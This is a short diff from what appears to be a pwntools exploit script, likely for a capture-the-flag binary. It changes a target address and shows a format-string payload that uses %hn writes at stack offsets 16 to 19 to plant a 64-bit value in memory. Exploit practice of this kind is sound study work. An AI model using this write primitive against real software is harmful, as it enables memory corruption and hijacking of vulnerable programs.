@@ -21,7 +21,7 @@ def dbg():
     gdb.attach(p,'b *0x40121A')
     pause()
 
-magic=0x404058
+magic=0x4CA2F0
 num=0x32107654ba98fedc
 # dbg()
 payload=f"%{0x3210}c%16$hn%{0x7654-0x3210}c%17$hn%{0xba98-0x7654}c%18$hn%{0xfedc-0xba98}c%19$hn".encode()
